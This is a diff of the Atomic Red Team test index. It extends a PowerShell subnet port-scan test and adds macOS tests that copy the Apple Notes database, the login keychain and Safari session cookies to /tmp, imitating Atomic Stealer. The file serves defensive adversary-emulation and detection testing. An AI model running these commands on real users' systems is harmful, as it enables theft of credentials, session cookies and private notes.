@@ -7064,33 +7064,57 @@ dependencies.1.get_prereq_command: sudo systemctl start docker
 T1046,Network Service Discovery,Port-Scanning /24 Subnet with PowerShell,05df2a79-dba6-4088-a804-9ca0802ca8e4,"Scanning common ports in a /24 subnet. If no IP address for the target subnet is specified the test tries to determine the attacking machine's ""primary"" IPv4 address first and then scans that address with a /24 netmask.
 The connection attempts to use a timeout parameter in milliseconds to speed up the scan. Please note the atomic might not print any output until the scans are completed.
 ",windows,,,"$ipAddr = ""#{ip_address}""
-if ($ipAddr -eq """") {
-    # Assumes the ""primary"" interface is shown at the top
-    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
-    Write-Host ""[i] Using Interface $interface""
-    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
-}
-Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""
-$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
-# Always assumes /24 subnet
-Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""
+if ($ipAddr -like ""*,*"") {
+    $ip_list = $ipAddr -split "",""
+    $ip_list = $ip_list.ForEach({ $_.Trim() })
+    Write-Host ""[i] IP Address List: $ip_list""
 
-$ports = #{port_list}
-$subnetIPs = 1..254 | ForEach-Object { ""$subnetSubstring$_"" }
+    $ports = #{port_list}
 
-foreach ($ip in $subnetIPs) {
-    foreach ($port in $ports) {
-      try {
-          $tcp = New-Object Net.Sockets.TcpClient
-          $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
-      } catch {}
-      if ($tcp.Connected) {
-          $tcp.Close()
-          Write-Host ""Port $port is open on $ip""
-      }
+    foreach ($ip in $ip_list) {
+        foreach ($port in $ports) {
+            Write-Host ""[i] Establishing connection to: $ip : $port""
+            try {
+                $tcp = New-Object Net.Sockets.TcpClient
+                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
+            } catch {}
+            if ($tcp.Connected) {
+                $tcp.Close()
+                Write-Host ""Port $port is open on $ip""
+            }
+        }
     }
-}
-",powershell,,,,,,"input_arguments.ip_address.description: IP-Address within the target subnet. Default is empty and script tries to determine local IP address of attacking machine.
+} elseif ($ipAddr -notlike ""*,*"") {
+    if ($ipAddr -eq """") {
+        # Assumes the ""primary"" interface is shown at the top
+        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
+        Write-Host ""[i] Using Interface $interface""
+        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
+    }
+    Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""
+    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
+    # Always assumes /24 subnet
+    Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""
+
+    $ports = #{port_list}
+    $subnetIPs = 1..254 | ForEach-Object { ""$subnetSubstring$_"" }
+
+    foreach ($ip in $subnetIPs) {
+        foreach ($port in $ports) {
+            try {
+                $tcp = New-Object Net.Sockets.TcpClient
+                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
+            } catch {}
+            if ($tcp.Connected) {
+                $tcp.Close()
+                Write-Host ""Port $port is open on $ip""
+            }
+        }
+    }
+} else {
+    Write-Host ""[Error] Invalid Inputs""
+    exit 1
+}",powershell,,,,,,"input_arguments.ip_address.description: IP-Address within the target subnet. Default is empty and script tries to determine local IP address of attacking machine. A comma separated list of targe IPs is also accepted (useful to simulate a wider scan while only scanning key host e.g., honeypots)
 
 input_arguments.ip_address.type: string
 
@@ -8384,6 +8408,14 @@ if grep -iq ""rhel\|fedora\|centos"" /usr/lib/os-release; then yum update -y && 
 input_arguments.remote_url.type: url
 
 input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1005/src
+
+"
+T1005,Data from Local System,Copy Apple Notes database files using AppleScript,cfb6d400-a269-4c06-a347-6d88d584d5f7,"This command will copy Apple Notes database files using AppleScript as seen in Atomic Stealer.
+",macos,,,"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""#{destination_path}""' -e 'set notesFolderPath to (path to home folder as text) & ""Library:Group Containers:group.com.apple.notes:""' -e 'set notesFolder to folder notesFolderPath' -e 'set notesFiles to {file ""NoteStore.sqlite"", file ""NoteStore.sqlite-shm"", file ""NoteStore.sqlite-wal""} of notesFolder' -e 'repeat with aFile in notesFiles' -e 'duplicate aFile to folder destinationFolderPath with replacing' -e 'end' -e 'end tell'",sh,False,,"rm ""#{destination_path}/NoteStore.sqlite*""",,,"input_arguments.destination_path.description: Specify the path to copy the database files into.
+
+input_arguments.destination_path.type: path
+
+input_arguments.destination_path.default: /private/tmp
 
 "
 T1573,Encrypted Channel,OpenSSL C2,21caf58e-87ad-440c-a6b8-3ac259964003,"Thanks to @OrOneEqualsOne for this quick C2 method.
@@ -19047,6 +19079,15 @@ input_arguments.cert_export.type: path
 input_arguments.cert_export.default: /tmp/certs.pem
 
 "
+T1555.001,Credentials from Password Stores: Keychain,Copy Keychain using cat utility,5c32102a-c508-49d3-978f-288f8a9f6617,"This command will copy the keychain using the cat utility in a manner similar to Atomic Stealer.
+",macos,,,"cat ~/Library/Keychains/login.keychain-db > #{keychain_export}
+",sh,False,,rm #{keychain_export},,,"input_arguments.keychain_export.description: Specify the path to copy they keychain into.
+
+input_arguments.keychain_export.type: path
+
+input_arguments.keychain_export.default: /tmp/keychain
+
+"
 T1547.003,Time Providers,Create a new time provider,df1efab7-bc6d-4b88-8be9-91f55ae017aa,"Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProvider.
 The new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt
 in C:\Users\Public\ as validation that the test is successful.
@@ -28592,6 +28633,14 @@ try {
 }
 Write-Host $cookies
 Stop-Process $chromeProcess -Force",powershell,False,,,,,
+T1539,Steal Web Session Cookie,Copy Safari BinaryCookies files using AppleScript,e57ba07b-3a33-40cd-a892-748273b9b49a,"This command will copy Safari BinaryCookies files using AppleScript as seen in Atomic Stealer.
+",macos,,,"osascript -e 'tell application ""Finder""' -e 'set destinationFolderPath to POSIX file ""#{destination_path}""' -e 'set safariFolder to ((path to library folder from user domain as text) & ""Containers:com.apple.Safari:Data:Library:Cookies:"")' -e 'duplicate file ""Cookies.binarycookies"" of folder safariFolder to folder destinationFolderPath with replacing' -e 'end tell'",sh,False,,"rm ""#{destination_path}/Cookies.binarycookies""",,,"input_arguments.destination_path.description: Specify the path to copy the BinaryCookies file into.
+
+input_arguments.destination_path.type: path
+
+input_arguments.destination_path.default: /private/tmp
+
+"
 T1558.002,Steal or Forge Kerberos Tickets: Silver Ticket,Crafting Active Directory silver tickets with mimikatz,385e59aa-113e-4711-84d9-f637aef01f2c,"Once the hash of service account is retrieved it is possible to forge Kerberos ticket granting service (TGS) tickets, also known as silver tickets.
 The generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.
 ",windows,,,"Remove-Item $env:TEMP\silver.bat -ErrorAction Ignore
